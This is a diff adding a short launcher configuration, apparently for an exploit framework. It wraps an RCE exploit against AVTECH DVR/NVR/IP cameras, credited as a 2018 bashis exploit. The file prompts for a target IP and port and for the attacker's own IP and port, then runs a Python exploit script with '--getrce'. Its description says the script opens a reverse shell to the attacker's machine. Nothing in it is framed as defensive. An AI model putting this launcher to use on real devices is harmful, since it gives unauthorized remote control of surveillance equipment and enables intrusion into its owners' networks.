@@ -1,0 +1,17 @@
+<sfjt>inject</sfjt>
+
+<cs1mc>Target IP :</cs1mc>
+<cs2mc>Target PORT :</cs2mc>
+<cs3mc>Your IP :</cs3mc>
+<cs4mc>Your PORT :</cs4mc>
+
+<zbz>1</zbz>
+<bz1>
+<cmd>python AVTECH-IPCP-RCE.py --rhost <cs1/> --rport <cs2/> --lhost <cs3/> --lport <cs4/> --getrce</cmd>
+</bz1>
+
+<bz>
+AVTECH {DVR/NVR/IPC} IPCP API admin l/p, RCE (2018 bashis)
+Reverse a shell
+Please make sure your ip and port£¡£¡£¡
+</bz>
